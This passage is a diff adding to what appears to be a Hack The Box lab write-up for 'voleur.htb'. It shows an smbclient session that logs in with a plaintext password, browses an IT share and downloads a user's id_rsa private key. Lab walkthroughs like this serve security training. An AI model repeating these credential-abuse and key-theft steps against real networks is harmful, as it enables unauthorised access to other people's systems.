@@ -481,5 +481,30 @@ Info: Establishing connection to remote endpoint
 I now have access as `jeremy.combs`
 
 
+```python
+faketime -f +8h smbclient -U voleur.htb/'jeremy.combs'%'qT3V9pLXyN7W4m' --realm=voleur.htb //dc.voleur.htb/IT
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Jan 29 04:10:01 2025
+  ..                                DHS        0  Thu Jul 24 16:09:59 2025
+  Third-Line Support                  D        0  Thu Jan 30 11:11:29 2025
 
+		5311743 blocks of size 4096. 993557 blocks available
+smb: \> cd "Third-Line Support"
+smb: \Third-Line Support\> dir
+  .                                   D        0  Thu Jan 30 11:11:29 2025
+  ..                                  D        0  Wed Jan 29 04:10:01 2025
+  id_rsa                              A     2602  Thu Jan 30 11:10:54 2025
+  Note.txt.txt                        A      186  Thu Jan 30 11:07:35 2025
+
+		5311743 blocks of size 4096. 993557 blocks available
+smb: \Third-Line Support\> get Note.txt.txt
+getting file \Third-Line Support\Note.txt.txt of size 186 as Note.txt.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
+smb: \Third-Line Support\> get id_rsa
+getting file \Third-Line Support\id_rsa of size 2602 as id_rsa (43.1 KiloBytes/sec) (average 23.1 KiloBytes/sec)
+smb: \Third-Line Support\> 
+```
+This user is apart of `third-line support`
+
+Ive got an SSH key for this user
 
